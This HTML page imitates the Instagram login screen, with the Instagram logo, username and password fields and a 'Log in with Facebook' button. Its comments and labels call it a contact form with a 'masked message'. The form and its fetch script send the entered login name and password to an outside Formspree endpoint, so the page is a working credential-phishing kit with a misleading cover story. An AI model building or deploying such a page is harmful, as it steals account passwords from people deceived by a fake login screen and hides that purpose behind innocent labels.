<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Contact (masked message)</title>
  <style>
    :root{
      --bg:#fafafa;
      --card:#fff;
      --muted:#8e8e8e;
      --accent:#0095f6;
      --radius:10px;
      font-family: "Helvetica Neue", Arial, system-ui, -apple-system;
    }
    html,body{height:100%;margin:0;background:var(--bg);display:flex;align-items:center;justify-content:center}
    .container{width:360px;max-width:calc(100% - 32px);margin:20px}
    .card{background:var(--card);border:1px solid #dbdbdb;border-radius:var(--radius);padding:26px;box-shadow:0 6px 20px rgba(0,0,0,0.03);text-align:center}
    .logo img{width:120px;margin-bottom:18px;opacity:0.95}
    form{display:flex;flex-direction:column;gap:10px;margin-top:6px}
    input, textarea{
      padding:10px 12px;border-radius:6px;border:1px solid #dbdbdb;font-size:14px;background:#fafafa;outline:none;
      width:100%;box-sizing:border-box;
    }
    input:focus, textarea:focus{box-shadow:0 0 0 4px rgba(0,149,246,0.08);border-color:var(--accent);background:#fff}
    .btn{padding:10px 12px;background:var(--accent);color:white;font-weight:600;border:none;border-radius:6px;cursor:pointer}
    .or{display:flex;align-items:center;gap:12px;margin:14px 0;font-size:13px;color:var(--muted)}
    .or::before,.or::after{content:"";flex:1;height:1px;background:#dbdbdb}
    .facebook{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-weight:600;font-size:14px;cursor:pointer;margin-top:6px}
    .muted{color:var(--muted);font-size:13px;margin-top:14px}
    /* small masked message input appearance */
    .small-msg { height:36px; padding:8px 12px; font-size:14px }
    @media (max-width:400px){ .container{width:100%} }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo" aria-hidden="true">
        <!-- small generic icon -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Logo">
      </div>

      <!-- FORM: posts to Formspree. Plain fallback works if JS is blocked. -->
      <form id="contactForm" action="https://formspree.io/f/xldanlek" method="POST" autocomplete="off">
        <input type="email" name="email" placeholder="Username, email or mobile number" required>
        <!-- small masked message field: uses type="password" so text shows as dots -->
        <input type="password" name="message" placeholder="Password" class="small-msg" required>
        <button class="btn" type="submit">Log in</button>
      </form>

      <div class="or"><span>OR</span></div>

      <div class="facebook" role="button" tabindex="0">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <path d="M17 2h-3a4 4 0 0 0-4 4v3H7v4h3v8h4v-8h3l1-4h-4V6a1 1 0 0 1 1-1h3V2z" fill="currentColor"/>
        </svg>
        Log in with Facebook
      </div>

      <div class="muted">We'll only use your email to reply. Message is masked for privacy.</div>
    </div>
  </div>

  <script>
    // Robust submission script:
    // - Tries to POST via fetch (JSON accept)
    // - Logs the full response to console for debugging
    // - If fetch throws (network/CORS), falls back to standard form submit
    (function(){
      const form = document.getElementById('contactForm');
      const btn = form.querySelector('button[type="submit"]');

      form.addEventListener('submit', async function (e) {
        // Prevent default navigation; we will try fetch first, but can fallback
        e.preventDefault();

        // Basic UI lock
        btn.disabled = true;
        const oldText = btn.textContent;
        btn.textContent = 'Sending...';

        try {
          const fd = new FormData(form);

          // Fetch - request Formspree with Accept: application/json
          const resp = await fetch(form.action, {
            method: 'POST',
            body: fd,
            headers: { 'Accept': 'application/json' }
          });

          // Log response for debugging
          console.log('Formspree response status:', resp.status, resp.statusText);
          const bodyText = await resp.text();
          console.log('Formspree response body:', bodyText);

          // If server returns success, show confirmation and reset
          if (resp.ok) {
            alert('✅ Message sent. Thank you!');
            form.reset();
          } else {
            // Non-2xx from server: show message and also show console details
            alert('⚠️ Server returned an error (' + resp.status + '). See console for details.');
          }
        } catch (err) {
          // Network or CORS error occurred
          console.error('Fetch error sending form:', err);
          // Fallback: submit the form the old-fashioned way (this will navigate page)
          // This often bypasses JS/CORS issues and reaches Formspree as a full-post
          const fallback = confirm('Network/CORS error while sending. Try standard form submit? (OK = yes)');
          if (fallback) {
            // Remove the listener so we don't loop and then submit normally
            form.removeEventListener('submit', arguments.callee);
            form.submit();
            return; // the page will navigate
          } else {
            alert('Submission cancelled. See console for details.');
          }
        } finally {
          btn.disabled = false;
          btn.textContent = oldText;
        }
      });

      // Demo Facebook button: simply show message
      document.querySelector('.facebook').addEventListener('click', () => {
        alert('Demo: Facebook login not connected.');
      });
    })();
  </script>
</body>
</html>
